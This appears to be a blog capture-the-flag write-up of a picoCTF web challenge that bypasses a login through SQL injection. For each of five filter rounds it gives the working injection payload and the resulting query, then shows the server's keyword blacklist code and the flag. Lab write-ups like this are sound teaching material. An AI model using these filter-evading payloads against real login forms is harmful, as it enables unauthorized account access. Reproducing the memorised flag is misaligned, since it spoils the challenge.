## Blog
https://frc6.com/index.php/archives/42/

## Source
https://play.picoctf.org/events/3/challenges/challenge/88

## Question
Can you beat the filters? Log in as admin 
http://jupiter.challenges.picoctf.org:50595/
http://jupiter.challenges.picoctf.org:50595/filter.php

It is actually execute the following sql in sqlite

SELECT * FROM users WHERE username='*[username]*' AND password='*[password]*'

## Attempts
attempts on http://jupiter.challenges.picoctf.org:50595/index.php

After the following attempts, it responds "Congrats! You won! Check out filter.php"

### Round 1 
filter: Round1: or

username: admin' --

password: 1 *(anything)*

SELECT * FROM users WHERE username='admin' --' AND password='1'

### Round 2
filter: Round2: or and like = --

username: admin'; /*

password: 1 *(anything)*

SELECT * FROM users WHERE username='admin'; /*' AND password='1'

### Round 3
filter: Round3:   or and = like > < --

Tips: there is a space char (" ") in the filter

username: admin';/*

password: 1 *(anything)*

SELECT * FROM users WHERE username='admin';/*' AND password='1'

### Round 4
filter: Round4:   or and = like > < -- admin

Tips: there is a space char (" ") in the filter

username: admi'||'n';

password: 1 *(anything)*

SELECT * FROM users WHERE username='admi'||'n';' AND password='1'

### Round 5
filter: Round5:   or and = like > < -- union admin

Tips: there is a space char (" ") in the filter

username: admi'||'n';

password: 1 *(anything)*

SELECT * FROM users WHERE username='admi'||'n';' AND password='1'

### You Won
![Round 6-5.png][1]

## Check out filter.php

    <?php
    session_start();
    
    if (!isset($_SESSION["round"])) {
        $_SESSION["round"] = 1;
    }
    $round = $_SESSION["round"];
    $filter = array("");
    $view = ($_SERVER["PHP_SELF"] == "/filter.php");
    
    if ($round === 1) {
        $filter = array("or");
        if ($view) {
            echo "Round1: ".implode(" ", $filter)."<br/>";
        }
    } else if ($round === 2) {
        $filter = array("or", "and", "like", "=", "--");
        if ($view) {
            echo "Round2: ".implode(" ", $filter)."<br/>";
        }
    } else if ($round === 3) {
        $filter = array(" ", "or", "and", "=", "like", ">", "<", "--");
        // $filter = array("or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
        if ($view) {
            echo "Round3: ".implode(" ", $filter)."<br/>";
        }
    } else if ($round === 4) {
        $filter = array(" ", "or", "and", "=", "like", ">", "<", "--", "admin");
        // $filter = array(" ", "/**/", "--", "or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
        if ($view) {
            echo "Round4: ".implode(" ", $filter)."<br/>";
        }
    } else if ($round === 5) {
        $filter = array(" ", "or", "and", "=", "like", ">", "<", "--", "union", "admin");
        // $filter = array("0", "unhex", "char", "/*", "*/", "--", "or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
        if ($view) {
            echo "Round5: ".implode(" ", $filter)."<br/>";
        }
    } else if ($round >= 6) {
        if ($view) {
            highlight_file("filter.php");
        }
    } else {
        $_SESSION["round"] = 1;
    }
    
    // picoCTF{y0u_m4d3_1t_d846125f7bdbf4d6e89cbc5edb6fa739}
    ?>

So, the Flag is `picoCTF{y0u_m4d3_1t_d846125f7bdbf4d6e89cbc5edb6fa739}`

  [1]: https://frc6.com/usr/uploads/2020/10/2029320702.png
